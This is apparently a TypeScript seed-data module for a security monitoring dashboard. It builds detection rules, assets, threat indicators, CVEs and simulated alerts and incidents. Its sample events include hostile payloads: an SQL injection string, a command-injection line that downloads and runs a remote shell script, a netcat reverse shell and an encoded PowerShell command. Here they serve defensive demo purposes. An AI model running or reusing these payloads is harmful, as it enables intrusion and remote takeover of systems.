import {
  SecurityEvent,
  AlertRecord,
  IncidentRecord,
  IOCRecord,
  CVERecord,
  AssetRecord,
  ResponseAuditRecord,
  DetectionRule,
  DashboardSummary,
  AttackType,
  SeverityLevel
} from './types';

// In-Memory Database Store with Complete Persistence API
class PrismDatabase {
  public events: SecurityEvent[] = [];
  public alerts: AlertRecord[] = [];
  public incidents: IncidentRecord[] = [];
  public iocs: IOCRecord[] = [];
  public cves: CVERecord[] = [];
  public assets: AssetRecord[] = [];
  public responseAudits: ResponseAuditRecord[] = [];
  public detectionRules: DetectionRule[] = [];
  public blockedIPs: Set<string> = new Set();
  public isolatedHosts: Set<string> = new Set();
  public responseMode: 'SIMULATION' | 'ENFORCE' = 'SIMULATION';
  public demoIntervalId: NodeJS.Timeout | null = null;
  public isDemoActive: boolean = false;

  constructor() {
    this.initRules();
    this.initAssets();
    this.initIOCs();
    this.initCVEs();
    this.seedHistoricalData();
  }

  private initRules() {
    this.detectionRules = [
      {
        rule_id: 'PRISM-SQL-001',
        name: 'SQL Injection Attack Detection',
        description: 'Detects SQL syntax injection patterns in HTTP parameters, bodies, and payloads',
        attack_type: 'SQL_INJECTION',
        severity: 'HIGH',
        enabled: true,
        confidence: 95
      },
      {
        rule_id: 'PRISM-RCE-001',
        name: 'Remote Code Execution Pattern',
        description: 'Detects command execution invocations, reverse shells, and shell binary calls',
        attack_type: 'RCE',
        severity: 'CRITICAL',
        enabled: true,
        confidence: 96
      },
      {
        rule_id: 'PRISM-MAL-001',
        name: 'Malware & Trojan Signature Detection',
        description: 'Identifies known malicious hashes, trojans, ransomware payloads, and cobalt strike beacons',
        attack_type: 'MALWARE',
        severity: 'CRITICAL',
        enabled: true,
        confidence: 94
      },
      {
        rule_id: 'PRISM-BF-001',
        name: 'Authentication Brute Force Detection',
        description: 'Monitors rapid failed authentication sequences from unified source IPs',
        attack_type: 'BRUTE_FORCE',
        severity: 'MEDIUM',
        enabled: true,
        confidence: 90
      },
      {
        rule_id: 'PRISM-SCAN-001',
        name: 'Network Port Scanning & Reconnaissance',
        description: 'Detects aggressive horizontal or vertical port probes within short timeframes',
        attack_type: 'PORT_SCAN',
        severity: 'MEDIUM',
        enabled: true,
        confidence: 88
      }
    ];
  }

  private initAssets() {
    this.assets = [
      {
        hostname: 'web-prod-01',
        ip_address: '10.0.1.25',
        asset_type: 'WEB_SERVER',
        criticality: 'CRITICAL',
        criticality_score: 9,
        owner: 'Core Platform Engineering',
        location: 'US-East-1 (Primary VPC)'
      },
      {
        hostname: 'db-core-01',
        ip_address: '10.0.2.10',
        asset_type: 'DATABASE',
        criticality: 'CRITICAL',
        criticality_score: 10,
        owner: 'Data Infrastructure Team',
        location: 'US-East-1 (Isolated Subnet)'
      },
      {
        hostname: 'auth-gateway-01',
        ip_address: '10.0.1.50',
        asset_type: 'AUTH_SERVER',
        criticality: 'CRITICAL',
        criticality_score: 9,
        owner: 'Identity & Access Team',
        location: 'US-East-1 (DMZ)'
      },
      {
        hostname: 'api-checkout-prod',
        ip_address: '10.0.1.80',
        asset_type: 'PAYMENT_GATEWAY',
        criticality: 'CRITICAL',
        criticality_score: 10,
        owner: 'Commerce Payments Team',
        location: 'US-East-1 (PCI Enclave)'
      },
      {
        hostname: 'internal-dns-01',
        ip_address: '10.0.0.2',
        asset_type: 'DNS_SERVER',
        criticality: 'HIGH',
        criticality_score: 7,
        owner: 'Network Operations',
        location: 'Global Backbone'
      },
      {
        hostname: 'dev-sandbox-04',
        ip_address: '10.0.99.12',
        asset_type: 'WORKSTATION',
        criticality: 'LOW',
        criticality_score: 2,
        owner: 'Staging Labs',
        location: 'Dev-VPC-NonProd'
      }
    ];
  }

  private initIOCs() {
    this.iocs = [
      {
        id: 'ioc-001',
        ioc: '185.220.101.45',
        type: 'IP',
        threat_level: 'critical',
        source: 'PRISM Threat Intelligence',
        confidence: 94,
        last_seen: new Date(Date.now() - 3600000).toISOString(),
        tags: ['Tor Exit Node', 'SQLi Scanner', 'Known Botnet'],
        description: 'Active attacker IP engaged in credential stuffing and web application exploitation.'
      },
      {
        id: 'ioc-002',
        ioc: '194.26.29.112',
        type: 'IP',
        threat_level: 'high',
        source: 'AlienVault OTX (Demo)',
        confidence: 91,
        last_seen: new Date(Date.now() - 7200000).toISOString(),
        tags: ['C2 Beacon', 'RCE Origin', 'Emotet'],
        description: 'Identified command-and-control server communicating with compromised endpoints.'
      },
      {
        id: 'ioc-003',
        ioc: '45.154.255.89',
        type: 'IP',
        threat_level: 'high',
        source: 'AbuseIPDB (Demo)',
        confidence: 89,
        last_seen: new Date(Date.now() - 14400000).toISOString(),
        tags: ['Port Scanner', 'Mirai Probe'],
        description: 'Persistent automated port scanner probing enterprise SSH and RDP vectors.'
      },
      {
        id: 'ioc-004',
        ioc: '103.145.13.204',
        type: 'IP',
        threat_level: 'medium',
        source: 'PRISM Threat Intelligence',
        confidence: 82,
        last_seen: new Date(Date.now() - 28800000).toISOString(),
        tags: ['Brute Force', 'Dict Attack'],
        description: 'Source of distributed dictionary attacks targeting public HTTPS endpoints.'
      },
      {
        id: 'ioc-005',
        ioc: 'malicious-c2-update.org',
        type: 'DOMAIN',
        threat_level: 'critical',
        source: 'PRISM Threat Intelligence',
        confidence: 96,
        last_seen: new Date(Date.now() - 1800000).toISOString(),
        tags: ['CobaltStrike', 'Stager', 'DNS Exfiltration'],
        description: 'Staging domain hosting second-stage payloads disguised as software updates.'
      },
      {
        id: 'ioc-006',
        ioc: 'api-sync-telemetry.cc',
        type: 'DOMAIN',
        threat_level: 'high',
        source: 'ThreatFox (Demo)',
        confidence: 90,
        last_seen: new Date(Date.now() - 12000000).toISOString(),
        tags: ['Data Exfiltration', 'Stealer'],
        description: 'Domain associated with RedLine infostealer telemetry exfiltration.'
      },
      {
        id: 'ioc-007',
        ioc: '44d88612fea8a8f36de82e1278abb02f',
        type: 'HASH',
        threat_level: 'critical',
        source: 'VirusTotal (Demo)',
        confidence: 98,
        last_seen: new Date(Date.now() - 900000).toISOString(),
        tags: ['Mimikatz', 'LSASS Dump', 'Credential Stealer'],
        description: 'Known binary signature of Mimikatz memory scraping utility.'
      },
      {
        id: 'ioc-008',
        ioc: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
        type: 'HASH',
        threat_level: 'high',
        source: 'PRISM Threat Intelligence',
        confidence: 92,
        last_seen: new Date(Date.now() - 40000000).toISOString(),
        tags: ['WannaCry', 'Ransomware Dropper'],
        description: 'Ransomware staging script signature.'
      },
      {
        id: 'ioc-009',
        ioc: 'http://185.220.101.45/payload.sh',
        type: 'URL',
        threat_level: 'critical',
        source: 'URLhaus (Demo)',
        confidence: 95,
        last_seen: new Date(Date.now() - 5000000).toISOString(),
        tags: ['Bash Dropper', 'RCE Payload'],
        description: 'Automated bash stager downloading rootkits onto compromised Linux servers.'
      },
      {
        id: 'ioc-010',
        ioc: 'finance-notice@evil-spoof.com',
        type: 'EMAIL',
        threat_level: 'medium',
        source: 'PhishTank (Demo)',
        confidence: 85,
        last_seen: new Date(Date.now() - 86400000).toISOString(),
        tags: ['Spear Phishing', 'BEC Target'],
        description: 'Spoofed sender involved in targeted executive credential theft.'
      },
      {
        id: 'ioc-011',
        ioc: '91.240.118.232',
        type: 'IP',
        threat_level: 'high',
        source: 'PRISM Threat Intelligence',
        confidence: 88,
        last_seen: new Date(Date.now() - 17000000).toISOString(),
        tags: ['SSH Bruteforce', 'Scanning'],
        description: 'Repeated automated root login attempts on edge jump hosts.'
      },
      {
        id: 'ioc-012',
        ioc: '193.142.146.33',
        type: 'IP',
        threat_level: 'medium',
        source: 'PRISM Threat Intelligence',
        confidence: 80,
        last_seen: new Date(Date.now() - 25000000).toISOString(),
        tags: ['Proxy Hop', 'Anonymous VPN'],
        description: 'Anonymous gateway used to obfuscate reconnaissance probes.'
      },
      {
        id: 'ioc-013',
        ioc: 'zero-day-test.ru',
        type: 'DOMAIN',
        threat_level: 'critical',
        source: 'PRISM Threat Intelligence',
        confidence: 95,
        last_seen: new Date(Date.now() - 10000000).toISOString(),
        tags: ['Exploit Delivery', 'Active C2'],
        description: 'High-risk host serving weaponized browser exploits.'
      },
      {
        id: 'ioc-014',
        ioc: '92.118.160.17',
        type: 'IP',
        threat_level: 'high',
        source: 'PRISM Threat Intelligence',
        confidence: 87,
        last_seen: new Date(Date.now() - 60000000).toISOString(),
        tags: ['SQL Injection', 'Crawler'],
        description: 'SQL injection automated scanner detected across multiple subdomains.'
      },
      {
        id: 'ioc-015',
        ioc: '89.208.103.11',
        type: 'IP',
        threat_level: 'critical',
        source: 'AlienVault OTX (Demo)',
        confidence: 93,
        last_seen: new Date(Date.now() - 32000000).toISOString(),
        tags: ['Log4Shell Exploit', 'RCE Target'],
        description: 'JNDI injection attempts targeting enterprise Java application ports.'
      },
      {
        id: 'ioc-016',
        ioc: '80.94.95.88',
        type: 'IP',
        threat_level: 'high',
        source: 'PRISM Threat Intelligence',
        confidence: 89,
        last_seen: new Date(Date.now() - 15000000).toISOString(),
        tags: ['WordPress Brute Force', 'XML-RPC'],
        description: 'Aggressive multi-threaded authentication attempts.'
      },
      {
        id: 'ioc-017',
        ioc: 'secure-login-portal-auth.net',
        type: 'DOMAIN',
        threat_level: 'high',
        source: 'PRISM Threat Intelligence',
        confidence: 91,
        last_seen: new Date(Date.now() - 44000000).toISOString(),
        tags: ['Phishing Portal', 'Credential Harvesting'],
        description: 'Cloned SSO landing page mimicking Okta enterprise login.'
      },
      {
        id: 'ioc-018',
        ioc: 'a1b2c3d4e5f6789012345678abcdef01',
        type: 'HASH',
        threat_level: 'medium',
        source: 'PRISM Threat Intelligence',
        confidence: 84,
        last_seen: new Date(Date.now() - 52000000).toISOString(),
        tags: ['Obfuscated PowerShell', 'Dropper'],
        description: 'Base64 encoded payload executed via scheduled tasks.'
      },
      {
        id: 'ioc-019',
        ioc: '178.62.204.101',
        type: 'IP',
        threat_level: 'medium',
        source: 'AbuseIPDB (Demo)',
        confidence: 78,
        last_seen: new Date(Date.now() - 70000000).toISOString(),
        tags: ['Syn Flood', 'DDoS Probe'],
        description: 'Probing SYN packet generation on internal TCP service ports.'
      },
      {
        id: 'ioc-020',
        ioc: 'billing-update-urgent@payroll-tax.biz',
        type: 'EMAIL',
        threat_level: 'high',
        source: 'PRISM Threat Intelligence',
        confidence: 86,
        last_seen: new Date(Date.now() - 80000000).toISOString(),
        tags: ['Wire Fraud', 'HR Impersonation'],
        description: 'Fraudulent email directing direct deposit redirection requests.'
      }
    ];
  }

  private initCVEs() {
    this.cves = [
      {
        cve_id: 'CVE-2024-12345',
        description: 'Remote code execution vulnerability via unauthenticated parameter evaluation in Web Services core component.',
        cvss_score: 9.8,
        severity: 'CRITICAL',
        affected_product: 'Web Application Server / HTTP Daemon',
        published_date: '2024-03-15',
        source_type: 'DEMO',
        reference_url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-12345'
      },
      {
        cve_id: 'CVE-2021-44228',
        description: 'Apache Log4j2 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints (Log4Shell).',
        cvss_score: 10.0,
        severity: 'CRITICAL',
        affected_product: 'Apache Log4j',
        published_date: '2021-12-10',
        source_type: 'LIVE',
        reference_url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228'
      },
      {
        cve_id: 'CVE-2023-48795',
        description: 'Terrapin Attack: General flaw in SSH protocol allows a man-in-the-middle attacker to truncate extension negotiation messages.',
        cvss_score: 7.5,
        severity: 'HIGH',
        affected_product: 'OpenSSH Server / Client',
        published_date: '2023-12-18',
        source_type: 'LIVE',
        reference_url: 'https://nvd.nist.gov/vuln/detail/CVE-2023-48795'
      },
      {
        cve_id: 'CVE-2024-3094',
        description: 'Malicious code was discovered in the upstream tarballs of xz, starting with version 5.6.0, leading to unauthorized SSH authentication bypass.',
        cvss_score: 10.0,
        severity: 'CRITICAL',
        affected_product: 'XZ Utils / liblzma',
        published_date: '2024-03-29',
        source_type: 'LIVE',
        reference_url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-3094'
      },
      {
        cve_id: 'CVE-2023-38606',
        description: 'Improper validation in kernel memory space permits local privilege escalation from unprivileged execution context.',
        cvss_score: 8.8,
        severity: 'HIGH',
        affected_product: 'Linux Kernel Core',
        published_date: '2023-07-24',
        source_type: 'LIVE',
        reference_url: 'https://nvd.nist.gov/vuln/detail/CVE-2023-38606'
      },
      {
        cve_id: 'CVE-2024-21413',
        description: 'Microsoft Outlook Remote Code Execution Vulnerability (MonikerLink bug allowing NTLM credential leaks and command execution).',
        cvss_score: 9.8,
        severity: 'CRITICAL',
        affected_product: 'Microsoft Office / Outlook',
        published_date: '2024-02-13',
        source_type: 'LIVE',
        reference_url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-21413'
      },
      {
        cve_id: 'CVE-2023-34362',
        description: 'SQL injection vulnerability in the MOVEit Transfer web application that could allow an unauthenticated attacker to gain unauthorized access.',
        cvss_score: 9.8,
        severity: 'CRITICAL',
        affected_product: 'MOVEit Transfer / SQL Backend',
        published_date: '2023-06-02',
        source_type: 'LIVE',
        reference_url: 'https://nvd.nist.gov/vuln/detail/CVE-2023-34362'
      },
      {
        cve_id: 'CVE-2024-27198',
        description: 'Authentication bypass vulnerability in TeamCity Web Server allowing an unauthenticated remote attacker to gain administrative control.',
        cvss_score: 9.8,
        severity: 'CRITICAL',
        affected_product: 'JetBrains TeamCity Server',
        published_date: '2024-03-04',
        source_type: 'LIVE',
        reference_url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-27198'
      },
      {
        cve_id: 'CVE-2022-22965',
        description: 'Spring Framework RCE via Data Binding on JDK 9+ (Spring4Shell) allowing arbitrary file upload and remote code execution.',
        cvss_score: 9.8,
        severity: 'CRITICAL',
        affected_product: 'Spring Framework Web MVC',
        published_date: '2022-04-01',
        source_type: 'LIVE',
        reference_url: 'https://nvd.nist.gov/vuln/detail/CVE-2022-22965'
      },
      {
        cve_id: 'CVE-2024-38077',
        description: 'Windows Remote Desktop Licensing Service Remote Code Execution Vulnerability (MadLicence).',
        cvss_score: 9.8,
        severity: 'CRITICAL',
        affected_product: 'Windows Remote Desktop Service',
        published_date: '2024-07-09',
        source_type: 'LIVE',
        reference_url: 'https://nvd.nist.gov/vuln/detail/CVE-2024-38077'
      }
    ];
  }

  private seedHistoricalData() {
    // Generate ~100 realistic events, 30 alerts, 10 incidents, and initial audit records
    const sampleIps = [
      '185.220.101.45', '194.26.29.112', '45.154.255.89', '103.145.13.204',
      '91.240.118.232', '193.142.146.33', '92.118.160.17', '89.208.103.11',
      '80.94.95.88', '178.62.204.101', '198.51.100.24', '203.0.113.88'
    ];
    const hosts = ['web-prod-01', 'db-core-01', 'auth-gateway-01', 'api-checkout-prod', 'internal-dns-01', 'dev-sandbox-04'];
    const now = Date.now();

    // 100 historical events
    for (let i = 1; i <= 100; i++) {
      const timeOffset = (100 - i) * 60000 * 5; // events spread over the past hours
      const timestamp = new Date(now - timeOffset).toISOString();
      const srcIp = sampleIps[i % sampleIps.length];
      const host = hosts[i % hosts.length];
      
      let eventType: SecurityEvent['event_type'] = 'http_request';
      let proto: SecurityEvent['protocol'] = 'HTTP';
      let payload = '';
      let url = '/api/v1/resource';

      if (i % 5 === 0) {
        // SQL Injection
        payload = "' OR '1'='1 --";
        url = `/login?id=1${encodeURIComponent(payload)}`;
        eventType = 'http_request';
      } else if (i % 5 === 1) {
        // RCE
        payload = "; /bin/bash -c 'wget http://185.220.101.45/payload.sh -O /tmp/x; chmod +x /tmp/x; /tmp/x'";
        url = `/api/exec?cmd=${encodeURIComponent(payload)}`;
        eventType = 'process_event';
      } else if (i % 5 === 2) {
        // Malware
        payload = "powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQp...";
        eventType = 'endpoint_event';
      } else if (i % 5 === 3) {
        // Brute Force
        payload = "admin:P@ssw0rd123!";
        eventType = 'auth_event';
        proto = 'HTTPS';
        url = '/api/auth/login';
      } else {
        // Port Scan
        payload = `SYN probe to port ${1000 + (i * 17) % 8000}`;
        eventType = 'network_event';
        proto = 'TCP';
      }

      this.events.push({
        event_id: `evt-${String(i).padStart(3, '0')}`,
        timestamp,
        source: i % 2 === 0 ? 'web_server' : 'endpoint_agent',
        source_ip: srcIp,
        destination_ip: '10.0.1.25',
        destination_port: 443,
        hostname: host,
        username: i % 3 === 0 ? 'admin' : 'svc_user',
        event_type: eventType,
        protocol: proto,
        method: 'POST',
        url,
        payload,
        user_agent: 'Mozilla/5.0 (Security Scanner Test)'
      });
    }

    // Seed 30 Alerts
    const attackTypes: AttackType[] = ['SQL_INJECTION', 'RCE', 'MALWARE', 'BRUTE_FORCE', 'PORT_SCAN'];
    for (let j = 1; j <= 30; j++) {
      const timeOffset = (30 - j) * 60000 * 18;
      const attackType = attackTypes[(j - 1) % attackTypes.length];
      const srcIp = sampleIps[j % sampleIps.length];
      const host = hosts[j % hosts.length];
      
      const isCritical = j % 3 === 0;
      const isHigh = j % 3 === 1;
      const severity: SeverityLevel = isCritical ? 'CRITICAL' : isHigh ? 'HIGH' : 'MEDIUM';
      const threatScore = isCritical ? 85 + (j % 15) : isHigh ? 65 + (j % 14) : 40 + (j % 18);

      const alertId = `alt-${String(j).padStart(3, '0')}`;
      const status: AlertRecord['status'] = j <= 5 ? 'NEW' : j <= 15 ? 'INVESTIGATING' : j <= 25 ? 'CONTAINED' : 'RESOLVED';

      const alertRecord: AlertRecord = {
        alert_id: alertId,
        timestamp: new Date(now - timeOffset).toISOString(),
        event_id: `evt-${String(j).padStart(3, '0')}`,
        attack_type: attackType,
        source_ip: srcIp,
        destination_ip: '10.0.1.25',
        destination_port: attackType === 'RCE' ? 8080 : 443,
        hostname: host,
        username: 'admin',
        url: attackType === 'SQL_INJECTION' ? "/login?id=1' OR '1'='1" : '/api/v1/system',
        payload: attackType === 'SQL_INJECTION' ? "' OR '1'='1 --" : attackType === 'RCE' ? "/bin/sh -c 'nc -e /bin/sh'" : undefined,
        ioc_match: j % 2 === 0,
        ioc_details: j % 2 === 0 ? {
          ioc: srcIp,
          type: 'IP',
          threat_level: isCritical ? 'critical' : 'high',
          source: 'PRISM Threat Intelligence',
          confidence: 92
        } : undefined,
        cve_match: isCritical,
        cve_details: isCritical ? {
          cve_id: 'CVE-2024-12345',
          cvss_score: 9.8,
          severity: 'CRITICAL',
          affected_product: 'Web Application Server'
        } : undefined,
        threat_score: threatScore,
        severity,
        score_factors: {
          attack_score: attackType === 'RCE' ? 40 : attackType === 'SQL_INJECTION' ? 35 : attackType === 'MALWARE' ? 38 : 25,
          attack_type: attackType,
          ioc_score: j % 2 === 0 ? 25 : 0,
          ioc_matched: j % 2 === 0 ? srcIp : undefined,
          cve_score: isCritical ? 20 : 0,
          cve_matched: isCritical ? 'CVE-2024-12345' : undefined,
          asset_score: 8,
          asset_hostname: host,
          confidence_score: 4,
          confidence_pct: 95,
          total_score: threatScore,
          severity,
          reasons: [
            `${attackType.replace('_', ' ')} signature verified`,
            ...(j % 2 === 0 ? [`Source IP matched active IOC (${srcIp})`] : []),
            ...(isCritical ? ['Correlated with CVE-2024-12345 (CVSS 9.8)'] : []),
            `Asset ${host} is marked tier-1 critical`
          ]
        },
        status,
        recommended_actions: isCritical ? ['BLOCK_IP', 'ISOLATE_HOST', 'ESCALATE_SOC'] : ['BLOCK_IP', 'CREATE_INCIDENT'],
        executed_actions: isCritical ? ['BLOCK_IP', 'ESCALATE_SOC'] : ['CREATE_INCIDENT'],
        response_mode: 'SIMULATION',
        incident_id: j <= 10 ? `inc-${String(j).padStart(3, '0')}` : undefined
      };

      this.alerts.push(alertRecord);

      if (isCritical) {
        this.blockedIPs.add(srcIp);
      }
    }

    // Seed 10 Incidents
    for (let k = 1; k <= 10; k++) {
      const correspondingAlert = this.alerts[k - 1];
      const incId = `inc-${String(k).padStart(3, '0')}`;
      this.incidents.push({
        incident_id: incId,
        alert_id: correspondingAlert.alert_id,
        title: `Security Incident: Active ${correspondingAlert.attack_type.replace('_', ' ')} on ${correspondingAlert.hostname}`,
        timestamp: correspondingAlert.timestamp,
        severity: correspondingAlert.severity,
        threat_score: correspondingAlert.threat_score,
        status: correspondingAlert.status,
        source_ip: correspondingAlert.source_ip,
        hostname: correspondingAlert.hostname,
        attack_type: correspondingAlert.attack_type,
        summary: `Automated detection triggered for high-confidence ${correspondingAlert.attack_type} probing from IP ${correspondingAlert.source_ip}. Threat score reached ${correspondingAlert.threat_score}/100.`,
        assigned_to: k % 2 === 0 ? 'Alex Chen (Tier 2 SOC)' : 'Sarah Vance (Incident Lead)',
        actions_taken: correspondingAlert.executed_actions,
        why_detected: correspondingAlert.score_factors.reasons
      });
    }

    // Seed Audit Records
    for (let m = 1; m <= 8; m++) {
      const alert = this.alerts[m - 1];
      this.responseAudits.push({
        id: `aud-${String(m).padStart(3, '0')}`,
        timestamp: alert.timestamp,
        actor: 'PRISM-AUTO',
        action: alert.executed_actions[0] || 'BLOCK_IP',
        target: alert.source_ip,
        reason: `Threat score ${alert.threat_score} surpassed automated mitigation threshold`,
        threat_score: alert.threat_score,
        mode: 'SIMULATION',
        result: 'SUCCESS',
        details: {
          alert_id: alert.alert_id,
          attack_type: alert.attack_type,
          rule: 'PRISM-POLICY-AUTO-MITIGATE'
        }
      });
    }
  }

  public getSummary(): DashboardSummary {
    const totalEvents = this.events.length;
    const activeThreats = this.alerts.filter(a => a.status === 'NEW' || a.status === 'INVESTIGATING').length;
    const criticalAlerts = this.alerts.filter(a => a.severity === 'CRITICAL' && a.status !== 'RESOLVED' && a.status !== 'FALSE_POSITIVE').length;
    const blockedCount = this.blockedIPs.size;
    const openIncidents = this.incidents.filter(i => i.status === 'NEW' || i.status === 'INVESTIGATING').length;
    
    const scores = this.alerts.map(a => a.threat_score);
    const avgScore = scores.length > 0 ? Math.round(scores.reduce((a, b) => a + b, 0) / scores.length) : 0;

    return {
      total_events: totalEvents,
      active_threats: activeThreats,
      critical_alerts: criticalAlerts,
      blocked_ips: blockedCount,
      open_incidents: openIncidents,
      average_threat_score: avgScore,
      response_mode: this.responseMode,
      system_status: 'healthy'
    };
  }
}

export const db = new PrismDatabase();
